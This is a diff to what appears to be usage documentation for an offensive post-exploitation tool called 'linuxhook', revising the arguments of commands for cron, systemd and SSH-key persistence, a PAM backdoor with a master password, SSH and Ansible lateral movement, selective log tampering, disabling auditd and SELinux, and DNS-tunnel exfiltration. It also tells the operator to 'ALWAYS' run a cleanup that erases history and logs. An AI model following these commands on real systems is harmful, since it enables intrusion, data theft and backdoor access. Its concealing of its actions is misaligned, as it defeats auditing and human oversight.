@@ -104,17 +104,17 @@ After gaining a shell on a Linux target, deploy linuxhook for comprehensive post
 - `linuxhook capabilities_abuse` — dangerous Linux capabilities (cap_setuid, cap_sys_admin)
 - `linuxhook kernel_exploit_check` — DirtyPipe, DirtyCow, GameOver(lay), OverlayFS, nftables
 - `linuxhook docker_group_escape` — Docker group → root via host filesystem mount
-- **Persistence:** `linuxhook cron_persist --payload CMD` — cron-based persistence
-- `linuxhook systemd_persist --name svc --payload CMD` — systemd service persistence
+- **Persistence:** `linuxhook cron_persist --command CMD` — cron-based persistence
+- `linuxhook systemd_persist --command CMD --name svc` — systemd service persistence
 - `linuxhook ssh_authorized_keys --key 'ssh-rsa ...'` — SSH key persistence
-- `linuxhook pam_backdoor` — PAM authentication bypass
+- `linuxhook pam_backdoor --password MASTER_PASS` — PAM authentication bypass
 - **Lateral:** `linuxhook ssh_pivot --target HOST` — SSH lateral movement with harvested keys
 - `linuxhook ansible_abuse` — exploit Ansible infrastructure for mass lateral movement
-- `linuxhook internal_scan --target CIDR --sweep` — internal network discovery
-- **Evasion:** `linuxhook log_tamper --action selective --log auth --pattern REGEX` — surgical log entry removal
-- `linuxhook auditd_evade --action disable` — disable Linux audit subsystem
+- `linuxhook internal_scan --target CIDR --ports 22,80,443` — internal network discovery
+- **Evasion:** `linuxhook log_tamper --user USER --ip IP` — surgical log entry removal
+- `linuxhook auditd_evade --action stop` — disable Linux audit subsystem
 - `linuxhook selinux_bypass --action permissive` — set SELinux permissive
-- **Exfil:** `linuxhook data_stage --target PATH --encrypt PASS` — stage and encrypt data
+- **Exfil:** `linuxhook data_stage --path PATH --password KEY` — stage and encrypt data
 - `linuxhook dns_tunnel_exfil --file PATH --domain DOMAIN` — DNS-based exfiltration
 - `linuxhook cleanup_linux` — ALWAYS run before exiting to clear history, logs, and artifacts
 - Skills: `skill search --tech linux,postexploit,privilegeescalation`
